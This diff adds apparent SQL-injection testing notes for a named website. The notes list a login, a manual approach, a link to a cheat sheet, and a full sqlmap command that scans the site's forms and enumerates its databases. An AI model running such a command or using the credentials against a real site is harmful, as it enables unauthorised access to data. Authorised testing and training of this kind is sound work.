@@ -1,0 +1,16 @@
+website: www.luxurytreats.com
+clue:    its found that the page is vulnerablie to sqli 
+user:    steve
+password: test@123
+
+manual process: Look around the page and find out the pages that have parameter 
+                we find orders 
+
+sqli cheetsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+automation: use sqlmap 
+
+sqlmap command:  
+sqlmap -u "http://www.luxurytreats.com" -p- --forms \
+  --batch --level=3 --risk=2 --threads=5 --random-agent --timeout=10 \
+  --technique=BEUST --dbs
